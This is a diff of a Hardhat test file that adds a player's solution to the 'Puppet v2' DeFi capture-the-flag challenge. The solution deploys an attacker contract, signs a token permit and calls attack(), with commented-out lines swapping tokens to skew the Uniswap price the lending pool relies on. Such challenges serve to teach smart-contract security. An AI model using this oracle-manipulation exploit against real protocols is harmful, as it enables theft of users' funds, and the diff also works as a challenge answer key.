@@ -5,6 +5,8 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { getPermitSignature } = require("../helper-methods");
+const { constants } = require("ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -82,7 +84,58 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        console.log("Deposit needed for 1 TLV token: ", await lendingPool.calculateDepositOfWETHRequired(10n ** 18n));
+
+        // await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // console.log("Player ETH: ", await ethers.provider.getBalance(player.address));
+
+        // // //const tx = await player.sendTransaction({to: uniswapExchange.address, value: 10n ** 18n, gasLimit: 1e6});
+
+        // await uniswapRouter.connect(player).swapExactTokensForETH(
+        //     PLAYER_INITIAL_TOKEN_BALANCE,
+        //     0,
+        //     [token.address, weth.address],
+        //     player.address,
+        //     (await ethers.provider.getBlock('latest')).timestamp * 2
+        // );
+        
+        // console.log("Deposit needed for 1 TLV token: ", await lendingPool.calculateDepositOfWETHRequired(10n ** 18n));
+        // console.log("Player ETH: ", await ethers.provider.getBalance(player.address));
+
+        const attacker = await (await ethers.getContractFactory('PuppetV2Attacker')).deploy(
+            uniswapRouter.address,
+            token.address,
+            lendingPool.address,
+            weth.address
+        );
+
+        const signature = await getPermitSignature({ 
+            wallet: player,
+            token: token,
+            spender: attacker.address,
+            value: PLAYER_INITIAL_TOKEN_BALANCE
+        });
+        
+        await attacker.connect(player).attack({
+            owner: player.address,
+            spender: attacker.address,
+            value: PLAYER_INITIAL_TOKEN_BALANCE,
+            deadline: constants.MaxUint256,
+            r: signature.r,
+            s: signature.s,
+            v: signature.v
+        },
+        {
+            value: PLAYER_INITIAL_ETH_BALANCE - ( 9n ** 18n)
+        });
+
+        console.log('User token balance: ', await token.balanceOf(player.address));
+        console.log('User ether balance: ', await ethers.provider.getBalance(player.address));
+        console.log('User weth balance: ', await weth.balanceOf(player.address));
+
+        console.log('Attacker contract token balance: ', await token.balanceOf(attacker.address));
+        console.log('Attacker contract ether balance: ', await ethers.provider.getBalance(attacker.address));
+        console.log('Attacker contract weth balance: ', await weth.balanceOf(attacker.address));
     });
 
     after(async function () {
